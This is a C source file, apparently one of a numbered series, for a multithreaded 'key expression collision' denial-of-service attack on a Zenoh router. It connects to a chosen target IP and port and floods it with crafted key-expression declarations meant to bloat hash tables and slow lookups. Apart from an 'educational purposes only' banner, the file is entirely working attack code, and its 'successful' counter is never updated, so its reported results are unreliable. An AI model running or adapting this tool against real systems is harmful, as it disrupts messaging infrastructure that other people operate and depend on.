/*
 * Attack 20: Key Expression Collision Attack
 * Creates hash collisions in key expression tables
 *
 * Compile: gcc -o attack20_keyexpr attack_20_keyexpr_collision.c -pthread
 * Run: ./attack20_keyexpr <target_ip> <target_port> <threads>
 *
 * WARNING: FOR EDUCATIONAL PURPOSES ONLY
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>
#include <signal.h>
#include <time.h>
#include <stdatomic.h>

#define Z_N_DECLARE 0x0B
#define Z_DECL_KEYEXPR 0x01

static volatile int g_running = 1;
static atomic_ullong g_collisions_attempted = 0;
static atomic_ullong g_packets_sent = 0;

typedef struct
{
    char *target_ip;
    int target_port;
    int thread_id;
} thread_args_t;

void signal_handler(int sig)
{
    printf("\n[!] Stopping key expression collision attack...\n");
    g_running = 0;
}

size_t encode_zint(unsigned char *buf, unsigned long long value)
{
    size_t i = 0;
    while (value > 0x7F)
    {
        buf[i++] = (unsigned char)((value & 0x7F) | 0x80);
        value >>= 7;
    }
    buf[i++] = (unsigned char)(value & 0x7F);
    return i;
}

// Generate key expressions designed to cause hash collisions
void generate_collision_keyexpr(char *buffer, int variant, unsigned long seed)
{
    switch (variant % 5)
    {
    case 0:
        // Long similar keys
        snprintf(buffer, 256, "attack/collision/%lu/aaaaaaaaaaaaaaaaaaaaa", seed);
        break;
    case 1:
        // Keys with same prefix
        snprintf(buffer, 256, "sensor/data/%lu", seed % 100);
        break;
    case 2:
        // Keys with unicode/special chars
        snprintf(buffer, 256, "key/%lu/☠️/💀/🔥", seed);
        break;
    case 3:
        // Very long keys
        snprintf(buffer, 256,
                 "a/b/c/d/e/f/g/h/i/j/k/l/m/n/o/p/q/r/s/t/u/v/w/x/y/z/%lu",
                 seed);
        break;
    case 4:
        // Keys with patterns known to cause collisions
        snprintf(buffer, 256, "/%lu/%lu/%lu/%lu",
                 seed, seed * 31, seed * 37, seed * 41);
        break;
    }
}

size_t craft_keyexpr_declaration(unsigned char *buffer, unsigned int keyexpr_id,
                                 const char *key)
{
    size_t offset = 0;

    // Network message: DECLARE
    buffer[offset++] = Z_N_DECLARE;

    // Declaration type: KEYEXPR
    buffer[offset++] = Z_DECL_KEYEXPR;

    // Key expression ID
    offset += encode_zint(buffer + offset, keyexpr_id);

    // Key expression string
    size_t key_len = strlen(key);
    offset += encode_zint(buffer + offset, key_len);
    memcpy(buffer + offset, key, key_len);
    offset += key_len;

    return offset;
}

void *attack_thread(void *arg)
{
    thread_args_t *args = (thread_args_t *)arg;
    int sock;
    struct sockaddr_in target_addr;
    unsigned char buffer[1024];
    char keyexpr[256];

    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0)
    {
        fprintf(stderr, "[-] Thread %d: Socket failed\n", args->thread_id);
        free(args);
        return NULL;
    }

    memset(&target_addr, 0, sizeof(target_addr));
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target_addr.sin_addr);

    if (connect(sock, (struct sockaddr *)&target_addr, sizeof(target_addr)) < 0)
    {
        fprintf(stderr, "[-] Thread %d: Connect failed\n", args->thread_id);
        close(sock);
        free(args);
        return NULL;
    }

    printf("[+] Thread %d connected, generating collisions\n", args->thread_id);

    unsigned int keyexpr_id = args->thread_id * 100000;
    unsigned long local_count = 0;

    while (g_running)
    {
        int variant = rand() % 5;
        generate_collision_keyexpr(keyexpr, variant, local_count);

        size_t msg_len = craft_keyexpr_declaration(buffer, keyexpr_id++, keyexpr);

        ssize_t sent = send(sock, buffer, msg_len, 0);
        if (sent < 0)
        {
            fprintf(stderr, "[-] Thread %d: Send failed\n", args->thread_id);
            break;
        }

        atomic_fetch_add(&g_collisions_attempted, 1);
        local_count++;

        if (local_count % 1000 == 0)
        {
            printf("[Thread %d] Generated %lu collision keyexprs\n",
                   args->thread_id, local_count);
        }

        usleep(100);
    }

    close(sock);
    printf("[*] Thread %d stopped\n", args->thread_id);
    free(args);
    return NULL;
}

int main(int argc, char *argv[])
{
    if (argc != 4)
    {
        fprintf(stderr, "Usage: %s <target_ip> <target_port> <threads>\n", argv[0]);
        return 1;
    }

    char *target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int num_threads = atoi(argv[3]);

    printf("╔════════════════════════════════════════════╗\n");
    printf("║   Zenoh Key Expression Collision Attack   ║\n");
    printf("║   WARNING: EDUCATIONAL PURPOSES ONLY       ║\n");
    printf("╚════════════════════════════════════════════╝\n\n");
    printf("[*] Target: %s:%d\n", target_ip, target_port);
    printf("[*] Threads: %d\n", num_threads);
    printf("[*] Effect: Hash table collisions, slow lookups\n\n");

    signal(SIGINT, signal_handler);
    srand(time(NULL));

    pthread_t threads[num_threads];
    time_t start = time(NULL);

    for (int i = 0; i < num_threads; i++)
    {
        thread_args_t *args = malloc(sizeof(thread_args_t));
        args->target_ip = target_ip;
        args->target_port = target_port;
        args->thread_id = i;
        pthread_create(&threads[i], NULL, attack_thread, args);
        usleep(50000);
    }

    printf("[+] Attack started!\n\n");

    while (g_running)
    {
        sleep(5);
        unsigned long long total = atomic_load(&g_collisions_attempted);
        unsigned long long successful = atomic_load(&g_packets_sent);
        time_t elapsed = time(NULL) - start;

        printf("\r[*] Time: %lds | Attempted: %llu | Successful: %llu | Rate: %.1f/s",
               elapsed, total, successful,
               elapsed > 0 ? (double)total / elapsed : 0.0);
        fflush(stdout);
    }

    printf("\n\n[*] Stopping attack...\n");

    for (int i = 0; i < num_threads; i++)
    {
        pthread_join(threads[i], NULL);
    }

    time_t total_time = time(NULL) - start;
    unsigned long long total = atomic_load(&g_collisions_attempted);
    unsigned long long successful = atomic_load(&g_packets_sent);

    printf("\n[*] Attack complete!\n");
    printf("    Duration: %ld seconds\n", total_time);
    printf("    Collisions attempted: %llu\n", total);
    printf("    Collisions successful: %llu\n", successful);
    printf("    Average rate: %.2f collisions/sec\n",
           total_time > 0 ? (double)total / total_time : 0.0);

    return 0;
}